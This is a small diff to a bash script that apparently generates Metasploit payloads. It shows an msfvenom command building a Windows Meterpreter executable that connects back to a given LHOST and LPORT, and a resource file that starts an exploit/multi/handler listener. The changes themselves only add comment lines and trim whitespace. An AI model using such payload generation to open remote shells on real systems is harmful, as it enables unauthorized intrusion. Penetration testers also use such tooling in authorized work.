@@ -66,7 +66,9 @@ function doAction {
   #echo -e " ${YELLOW}[i]${RESET}  SHA1: $(sha1sum ${FILENAME} | awk '{print $1}')"
 
   cat <<EOF > "${FILEHANDLE}"
+#
 # RUN:   service postgresql start; service metasploit start; msfconsole -q -r "${FILENAME}"
+#
 setg TimestampOutput true
 setg VERBOSE true
 use exploit/multi/handler
@@ -149,7 +151,7 @@ elif [[ "${TYPE}" == "windows" ]] || [[ "${TYPE}" == "win" ]] || [[ "${TYPE}" ==
   CMD="msfvenom --payload ${PAYLOAD} --format exe --platform ${TYPE} --arch x86 LHOST=${IP} LPORT=${PORT} -o ${outputPath}${TYPE}_meterpreter.${FILEEXT}"
   doAction "Windows" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}"
 elif [[ -z "${TYPE}" ]]; then
-  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}  "
+  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}"
 else
   echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}"
 fi
